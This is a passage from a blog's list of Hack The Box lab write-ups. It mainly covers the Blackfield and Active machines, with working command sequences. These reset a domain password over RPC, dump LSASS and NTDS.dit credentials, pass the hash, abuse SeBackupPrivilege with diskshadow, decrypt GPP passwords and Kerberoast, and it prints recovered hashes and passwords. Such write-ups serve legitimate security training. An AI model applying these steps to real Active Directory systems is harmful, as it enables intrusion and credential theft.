+<p>After research, nothing special. But came along with a article using rpc to reset domain user password</p>
+<p><a target="_blank" rel="noopener" href="https://room362.com/post/2017/reset-ad-user-password-with-linux/">Reset AD User password with Linux</a></p>
+<p>Make a change to user <strong>audit2020</strong> password to Ikonw123!</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; setuserinfo2</span><br><span class="line">Usage: setuserinfo2 username level password [password_expired]</span><br><span class="line">result was NT_STATUS_INVALID_PARAMETER</span><br><span class="line">rpcclient $&gt; setuserinfo2 audit2020 23 Ikonw123!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Sadly, we still not able login using winrm but we can access <strong>audit2020</strong>‘s smb share again.</p>
+<p>yeah smb share againnnn.</p>
+<p>This time round, forensic folder is available to us</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/opt/nmapAutomator/10.10.10.192/nmap]</span><br><span class="line">└─<span class="comment"># smbmap -H 10.10.10.192 -u audit2020 -p Ikonw123!</span></span><br><span class="line">[+] IP: 10.10.10.192:445        Name: BLACKFIELD.<span class="built_in">local</span>                                  </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        forensic                                                READ ONLY       Forensic / Audit share.</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                READ ONLY       Logon server share </span><br><span class="line">        profiles$                                               READ ONLY</span><br><span class="line">        SYSVOL                                                  READ ONLY       Logon server share </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/opt/nmapAutomator/10.10.10.192/nmap]</span><br><span class="line">└─<span class="comment"># smbclient \\\\10.10.10.192\\forensic -U audit2020                                      </span></span><br><span class="line">Enter WORKGROUP\audit2020&#x27;s password: </span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D       <span class="number"> 0 </span> Sun Feb<span class="number"> 23 </span>21:03:16 2020</span><br><span class="line">  ..                                  D       <span class="number"> 0 </span> Sun Feb<span class="number"> 23 </span>21:03:16 2020</span><br><span class="line">  commands_output                     D       <span class="number"> 0 </span> Mon Feb<span class="number"> 24 </span>02:14:37 2020</span><br><span class="line">  memory_analysis                     D       <span class="number"> 0 </span> Fri May<span class="number"> 29 </span>04:28:33 2020</span><br><span class="line">  tools                               D       <span class="number"> 0 </span> Sun Feb<span class="number"> 23 </span>21:39:08 2020</span><br><span class="line"></span><br><span class="line">               <span class="number"> 7846143 </span>blocks of size 4096.<span class="number"> 3978511 </span>blocks available</span><br><span class="line">smb: \&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Alright, it seems tons of files. Download the folder to local (If your internet connection is slow, you might also consider just mount the smb directory to local)</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">recurse</span> <span class="literal">ON</span></span><br><span class="line"><span class="attribute">prompt</span> <span class="literal">OFF</span></span><br><span class="line"><span class="attribute">mget</span> *</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>A DMP file is a file that contains data “dumped” from a program’s memory space. It is often created when a program has an error or crashes and may also be saved by the program “Savedump.exe” on the first reboot after a crash. DMP files are usually named “Memory.dmp.”</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/skelsec/pypykatz">pypykatz</a> has the ability to parse the secrets hidden in the LSASS process, it is just something like mimikatz’s <strong>sekurlsa::</strong></p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">pypykatz</span> lsa minidump lsass.DMP</span><br></pre></td></tr></table></figure>
+
+<p>and we actually got the password hash for user <strong>svc_backup</strong></p>
+<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="section">== MSV ==</span></span><br><span class="line"><span class="code">        Username: svc_backup</span></span><br><span class="line"><span class="code">        Domain: BLACKFIELD</span></span><br><span class="line"><span class="code">        LM: NA</span></span><br><span class="line"><span class="code">        NT: 9658d1d1dcd9250115e2205d9f48400d</span></span><br><span class="line"><span class="code">        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>No need to bruteforce, we can directly pass the hash using evil-winrm</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">──(root💀kali)-[/opt/nmapAutomator/10.10.10.192/nmap/memory_analysis]</span><br><span class="line">└─# evil-winrm.rb -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192   </span><br></pre></td></tr></table></figure>
+
+<h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h2><p>After checking the user’s privileges, found out that <strong>SeBackupPrivilege</strong> is enabled.</p>
+<blockquote>
+<p><strong>SeBackupPrivilege</strong><br>Description: This privilege causes the system to grant all read access control to any file, regardless of the <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/library/windows/desktop/ms721532#-security-access-control-list-gly"><em>access control list</em></a> (ACL) specified for the file.</p>
+</blockquote>
+<p>Firstly, I tried the <strong>vssadmin</strong>, well I don’t have the privilege</p>
+<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users&gt; vssadmin create shadow /for=C:</span><br><span class="line">vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool</span><br><span class="line">(C) Copyright 2001<span class="string">-2013</span> Microsoft Corp.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Error: </span>You don&#x27;t have the correct permissions to run this command.  Please run this utility from a command</span><br><span class="line">window that has elevated administrator privileges.</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Members of “Backup Operators” can logon locally on a Domain Controller and backup the NTDS.DIT, for ex. with: “wbadmin.exe” or “diskshadow.exe</p>
+</blockquote>
+<p>As I read carefully, found out that diskshadow allow us to create a new shadow disk copy of the disk C and expose it as another driver</p>
+<p>shadow_copy.txt</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> context <span class="comment">persistent nowriters</span></span><br><span class="line">add <span class="comment">volume c: alias ikonw</span></span><br><span class="line">create</span><br><span class="line">expose <span class="comment">%ikonw% z:</span></span><br></pre></td></tr></table></figure>
+
+<p>However it has error </p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">-&gt; <span class="keyword">set</span> context persistent nowriter  &lt;&lt;<span class="comment">--- shudnt it be nowriters?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> CONTEXT &#123; CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | <span class="keyword">VOLATILE</span> [ NOWRITERS ] &#125;</span><br><span class="line"></span><br><span class="line">        CLIENTACCESSIBLE        Specify <span class="keyword">to</span> <span class="keyword">create</span> shadow copies usable <span class="keyword">by</span> client versions <span class="keyword">of</span> Windows.</span><br><span class="line">        PERSISTENT              Specify that shadow <span class="keyword">copy</span> <span class="keyword">is</span> persist across program <span class="keyword">exit</span>, <span class="keyword">reset</span> <span class="keyword">or</span> reboot.</span><br><span class="line">        PERSISTENT NOWRITERS    Specify that shadow <span class="keyword">copy</span> <span class="keyword">is</span> persistent <span class="keyword">and</span> <span class="keyword">all</span> writers are excluded.</span><br><span class="line">        <span class="keyword">VOLATILE</span>                Specify that shadow <span class="keyword">copy</span> will be deleted <span class="keyword">on</span> <span class="keyword">exit</span> <span class="keyword">or</span> <span class="keyword">reset</span>.</span><br><span class="line">        <span class="keyword">VOLATILE</span> NOWRITERS      Specify that shadow <span class="keyword">copy</span> <span class="keyword">is</span> <span class="keyword">volatile</span> <span class="keyword">and</span> <span class="keyword">all</span> writers are excluded.</span><br><span class="line"></span><br><span class="line">        Example: <span class="keyword">SET</span> CONTEXT CLIENTACCESSIBLE</span><br></pre></td></tr></table></figure>
+
+<p>Add extra character behind</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> context <span class="comment">persistent nowriterss</span></span><br><span class="line">add <span class="comment">volume c: alias ikonww</span></span><br><span class="line">createe</span><br><span class="line">expose <span class="comment">%ikonw% z::</span></span><br></pre></td></tr></table></figure>
+
+<p>However one more error!!</p>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">The .cab metadata <span class="built_in">file</span> cannot be stored <span class="keyword">in</span> <span class="keyword">the</span> current working <span class="built_in">directory</span>, because <span class="keyword">it</span> is <span class="built_in">read</span>-only.</span><br></pre></td></tr></table></figure>
+
+<p>ermmm, maybe I am in the <strong>document directory</strong></p>
+<p>create a temp folder at <strong>C:\temp</strong></p>
+<p>Finally, we successfully create the shadow disk at Z: drive</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; diskshadow /s shadow_copy.txt</span><br><span class="line">Microsoft DiskShadow version 1.0</span><br><span class="line">Copyright (C) 2013 Microsoft Corporation</span><br><span class="line">On computer:  DC01,  9/8/2020 5:40:45 AM</span><br><span class="line"></span><br><span class="line">-&gt; <span class="built_in">set</span> context persistent nowriters</span><br><span class="line">-&gt; add volume c: <span class="built_in">alias</span> ikonw</span><br><span class="line">-&gt; create</span><br><span class="line">Alias ikonw <span class="keyword">for</span> shadow ID &#123;f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922&#125; <span class="built_in">set</span> as environment variable.</span><br><span class="line">Alias VSS_SHADOW_SET <span class="keyword">for</span> shadow <span class="built_in">set</span> ID &#123;115480f7-6f83-46ee-8ea6-4fcf8bcb1d81&#125; <span class="built_in">set</span> as environment variable.</span><br><span class="line"></span><br><span class="line">Querying all shadow copies with the shadow copy <span class="built_in">set</span> ID &#123;115480f7-6f83-46ee-8ea6-4fcf8bcb1d81&#125;</span><br><span class="line"></span><br><span class="line">        * Shadow copy ID = &#123;f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922&#125;               %ikonw%</span><br><span class="line">                - Shadow copy <span class="built_in">set</span>: &#123;115480f7-6f83-46ee-8ea6-4fcf8bcb1d81&#125;       %VSS_SHADOW_SET%</span><br><span class="line">                - Original count of shadow copies = 1</span><br><span class="line">                - Original volume name: \\?\Volume&#123;351b4712-0000-0000-0000-602200000000&#125;\ [C:\]</span><br><span class="line">                - Creation time: 9/8/2020 5:40:45 AM</span><br><span class="line">                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</span><br><span class="line">                - Originating machine: DC01.BLACKFIELD.<span class="built_in">local</span></span><br><span class="line">                - Service machine: DC01.BLACKFIELD.<span class="built_in">local</span></span><br><span class="line">                - Not exposed</span><br><span class="line">                - Provider ID: &#123;b5946137-7b9f-4925-af80-51abd60b20d5&#125;</span><br><span class="line">                - Attributes:  No_Auto_Release Persistent No_Writers Differential</span><br><span class="line"></span><br><span class="line">Number of shadow copies listed: 1</span><br><span class="line">-&gt; expose %ikonw% z:</span><br><span class="line">-&gt; %ikonw% = &#123;f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922&#125;</span><br><span class="line">The shadow copy was successfully exposed as z:\.</span><br><span class="line">-&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-Blackfield-Hard/image-20200908134638982.png" alt="image-20200908134638982"></p>
+<p>The z: drive shadow folder permission also inherited from the C:, we dont have the permission to download the files.</p>
+<p>After looking at the <a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege">github page</a></p>
+<blockquote>
+<ul>
+<li>If you want to read&#x2F;copy data out of a “normally forbidden” folder, you have to act as a backup software. The shell <code>copy</code> command won’t work; you’ll need to open the source file manually using <code>CreateFile</code> making sure to specify the <code>FILE_FLAG_BACKUP_SEMANTICS</code> flag.</li>
+</ul>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll">SeBackupPrivilegeCmdLets.dll</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll">SeBackupPrivilegeUtils.dll</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Evil-WinRM* PS C:\temp&gt; Import-Module .\SeBackupPrivilegeUtils.dll</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; <span class="built_in">cd</span> z:\windows\ntds</span><br><span class="line">*Evil-WinRM* PS z:\windows\ntds&gt; Copy-FileSeBackupPrivilege ntds.dit c:\temp\ntds.dit</span><br><span class="line">*Evil-WinRM* PS z:\windows\ntds&gt; <span class="built_in">cd</span> c:\temp</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----         9/8/2020   5:40 AM            617 2020-09-08_5-40-45_DC01.cab</span><br><span class="line">-a----         9/8/2020   5:52 AM       18874368 ntds.dit</span><br><span class="line">-a----         9/8/2020   5:50 AM          12288 SeBackupPrivilegeCmdLets.dll</span><br><span class="line">-a----         9/8/2020   5:51 AM          16384 SeBackupPrivilegeUtils.dll</span><br><span class="line">-a----         9/8/2020   5:40 AM             88 shadow_copy.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>and we got the ntds.dit files. download to kali</p>
+<p>and use <strong>secretsdump</strong> ,I just realize still need a extra system hive file.</p>
+<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">reg save <span class="params">HKLM</span>\<span class="params">SYSTEM</span> c:\temp\<span class="params">system</span>.hive</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/hackthebox/Windows/blackfield]</span><br><span class="line">└─<span class="comment"># python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.hive -hashes lmhash:nthash LOCAL -outputfile hash | more</span></span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line">[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching <span class="keyword">for</span> pekList, be patient</span><br><span class="line">[*] PEK <span class="comment"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span></span><br><span class="line">[*] Reading and decrypting hashes from ntds.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::</span><br><span class="line">audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::</span><br><span class="line">support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::</span><br></pre></td></tr></table></figure>
+
+<p>and we got the administrator hash, use evil-winrm to login and we got root!</p>
+<br/>
+<br/>
+<br/>
+
+
+<p><img src="/images/root.gif" alt="root"></p>
+
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			            
+				<a class="link" href="/tags/hard/">hard</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/06/10/HTB-BlackField/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/05/12/HTB-cache/">HTB Cache Writeup</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>May 12, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		
+			<p>Cache writeup available</p>
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/HackTheBox-Medium/">HackTheBox-Medium</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/05/12/HTB-cache/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/02/10/HTB-Active/">HTB Active Writeup</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Feb 10, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<p>攻击机：官方Kali linux 2019 64位<br>作者：<strong>Ikonw</strong></p>
+<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><img src="/images/old-machine-images/20200210210254278.png" alt="在这里插入图片描述"></p>
+<h1 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h1><p>这边我用的是我在OSCP时候用的一个脚本工具（懒惰）</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a><br><img src="/images/old-machine-images/202002102107263.png" alt="在这里插入图片描述"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./nmapAutomator.sh 10.10.10.100 Full</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>除了53和445并没有什么特别能交互的端口</p>
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">Starting</span> <span class="selector-tag">Nmap</span> <span class="number">7.80</span> ( <span class="attribute">https</span>:<span class="comment">//nmap.org ) at 2020-02-10 18:56 +08</span></span><br><span class="line">Nmap scan report for <span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line">Host is up (<span class="number">0.23s</span> latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line"><span class="number">53</span>/tcp    open  domain        Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39) (Windows Server <span class="number">2008</span> R2 SP1)</span><br><span class="line">| <span class="attribute">dns-nsid</span>: </span><br><span class="line">|_  bind.<span class="attribute">version</span>: Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39)</span><br><span class="line"><span class="number">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="attribute">time</span>: <span class="number">2020</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">10</span>:<span class="number">57</span>:<span class="number">27</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (<span class="attribute">Domain</span>: active.htb, <span class="attribute">Site</span>: Default-First-Site-Name)</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft-ds?</span><br><span class="line"><span class="number">464</span>/tcp   open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (<span class="attribute">Domain</span>: active.htb, <span class="attribute">Site</span>: Default-First-Site-Name)</span><br><span class="line"><span class="number">3269</span>/tcp  open  tcpwrapped</span><br><span class="line"><span class="number">5722</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">9389</span>/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line"><span class="number">47001</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|<span class="attribute">_http-server-header</span>: Microsoft-HTTPAPI/<span class="number">2.0</span></span><br><span class="line">|<span class="attribute">_http-title</span>: <span class="keyword">Not</span> Found</span><br><span class="line"><span class="number">49152</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49153</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49154</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49155</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49157</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">49158</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49169</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49171</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49182</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service <span class="attribute">Info</span>: <span class="attribute">Host</span>: DC; <span class="attribute">OS</span>: Windows; <span class="attribute">CPE</span>: <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">microsoft</span>:<span class="attribute">windows_server_2008</span>:<span class="attribute">r2</span>:sp1, <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">microsoft</span>:windows</span><br><span class="line"></span><br><span class="line">Host script <span class="attribute">results</span>:</span><br><span class="line">|<span class="attribute">_clock-skew</span>: <span class="number">38s</span></span><br><span class="line">| <span class="attribute">smb2-security-mode</span>: </span><br><span class="line">|   <span class="number">2.02</span>: </span><br><span class="line">|_    Message signing enabled <span class="keyword">and</span> required</span><br><span class="line">| <span class="attribute">smb2-time</span>: </span><br><span class="line">|   <span class="attribute">date</span>: <span class="number">2020</span><span class="attribute">-02-10T10</span>:<span class="number">58</span>:<span class="number">25</span></span><br><span class="line">|_  <span class="attribute">start_date</span>: <span class="number">2020</span><span class="attribute">-02-10T08</span>:<span class="number">17</span>:<span class="number">06</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at <span class="attribute">https</span>:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap <span class="attribute">done</span>: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">194.25</span> seconds</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="一，SMB-ENUMERATION"><a href="#一，SMB-ENUMERATION" class="headerlink" title="一，SMB ENUMERATION"></a>一，SMB ENUMERATION</h1><p>首先 使用smbmap 来确定anonymous用户的权限（如果有写权限可以直接用impacket 来获取shell）</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.100</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>发现对 <strong>Replication</strong> 文件夹 <strong>READ ONLY</strong>权限<br><img src="/images/old-machine-images/20200210211447140.png" alt="在这里插入图片描述"><br>（这里我本来想使用mount挂载smb, 但失败了。有成功的可以在评论告诉我。）</p>
+<p>使用 smbclient进行连接 <strong>Replication</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">smbclient <span class="symbol">\\</span><span class="symbol">\\</span>10.10.10.100<span class="symbol">\\</span>Replication</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>发现两个有意思的文件夹</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">31B2F340</span>-<span class="number">016</span>D-<span class="number">11</span>D2-<span class="number">945</span>F-<span class="number">00</span>C04FB984F9 是Default admin policy</span><br><span class="line"><span class="attribute">6AC1786C</span>-<span class="number">016</span>F-<span class="number">11</span>D2-<span class="number">945</span>F-<span class="number">00</span>C04fB984F9 是Default domain polices</span><br><span class="line"><span class="attribute">12</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/old-machine-images/2020021021181611.png" alt="在这里插入图片描述"><br>如果没记错的话 windows server 2012以下的版本 会把密码储存在GPO。<br>经过一番查找<br><strong>smb: \active.htb\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups</strong></p>
+<p>在此目录发现Groups.xml</p>
+<p><img src="/images/old-machine-images/20200210212552448.png" alt="在这里插入图片描述"><br>发现帐号和密码哈希值</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">帐号：active.htb\SVC_TGS</span><br><span class="line">哈希值：edBSHOwhZLTjt<span class="regexp">/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/</span>NglVmQ</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
+
+<p>可以使用kali自带的gpp-decrypt来破解密码</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gpp-decrypt edBSHOwhZLTjt<span class="regexp">/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/</span>NglVmQ</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>得到密码 <strong>GPPstillStandingStrong2k18</strong><br><img src="/images/old-machine-images/20200210212726788.png" alt="在这里插入图片描述"><br>现在我们有了新的帐号 利用Smbmap确认我们是否有写的权限（拿shell）</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.100</span> -u SVC_TGS -p GPPstillStandingStrong2k18</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/old-machine-images/20200210213100537.png" alt="在这里插入图片描述"><br>发现能读权限能读到user目录里的文件<br>可以用smbclient 进去拿user.txt</p>
+<h1 id="三，ROOT"><a href="#三，ROOT" class="headerlink" title="三，ROOT"></a>三，ROOT</h1><p>之前看到 端口88 有 kerberos 在运行。尝试利用kerberoasing 攻击</p>
+<p><a target="_blank" rel="noopener" href="https://www.chainnews.com/articles/094369852800.htm">Kerberoasing 攻击</a></p>
+<p>利用 impacket-GetUserSPNs</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/impacket-GetUserSPNs -request active.htb/</span>SVC_TGS:GPPstillStandingStrong2k18 -dc-ip <span class="number">10.10</span>.<span class="number">10.100</span> </span><br><span class="line"></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/old-machine-images/20200210221812462.png" alt="在这里插入图片描述"><br>得到hash后 利用john the ripper进行破解<br>得到 Administrator密码为 Ticketmaster1968<br><img src="/images/old-machine-images/202002102219053.png" alt="在这里插入图片描述"></p>
+<p>取到帐号和密码后 我们可以使用 impacket psexec 进行登录</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/doc/</span>python3-impacket<span class="regexp">/examples/</span>psexec.py active.htb/Administrator:Ticketmaster1968@<span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/old-machine-images/20200210222712526.png" alt="在这里插入图片描述"></p>
+<p>成功 拿到Administrator</p>
+<br/>
+<br/>
+<br/>
+
+<p><img src="/images/root.gif" alt="root"></p>
+
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			            
+				<a class="link" href="/tags/smb/">smb</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/02/10/HTB-Active/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+
+	
+	
+ 
+   <nav class="paginator">
+    
+        <a class="prev" href="/page/3/"> 
+            <i class="iconfont icon-left"></i>
+            Prev
+        </a>
+    
+
+   <span class="page-number"> Page <strong>4</strong>, Posts <strong>28</strong>. </span>
+
+    
+        <a class="next" href="/page/5/"> 
+            Next
+            <i class="iconfont icon-right"></i>
+        </a>
+    
+  </nav> 
+
+	
+
+    <script type="text/x-mathjax-config">
+        var post = document.getElementsByClassName("post")[0];  
